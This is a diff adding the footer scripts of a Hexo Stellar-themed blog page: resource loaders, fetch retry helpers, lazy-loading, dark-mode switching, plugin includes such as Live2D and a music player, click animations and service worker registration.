+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const l_body = document.querySelector('.l_body');
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=mozbt5o9" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/scrollreveal@4.0/dist/scrollreveal.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const slideUp = {
+      distance: `12px`,
+      duration: `400`,
+      interval: `80`,
+      scale: `0.98`,
+      opacity: 0,
+      easing: "ease-out",
+      reset: false,
+      mobile: false,
+      useDelay: 'once'
+    };
+    ScrollReveal({ container: '.widgets' }).reveal('.slide-up', { ...slideUp });
+    ScrollReveal({ container: '.l_main' }).reveal('.slide-up', { ...slideUp });
+    ScrollReveal({ container: '.l_right' }).reveal('.slide-up', { ...slideUp });
+  });
+</script>
+<script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    mermaid.initialize({
+      theme: "default",
+      logLevel: 3
+    });
+    mermaid.run({ querySelector: '.mermaid' });
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js?v=mozbt5o9"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 0 !important;
+    right: 10px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: scale(var(--waifu-scale, 1)) !important;
+    transform-origin: bottom right !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
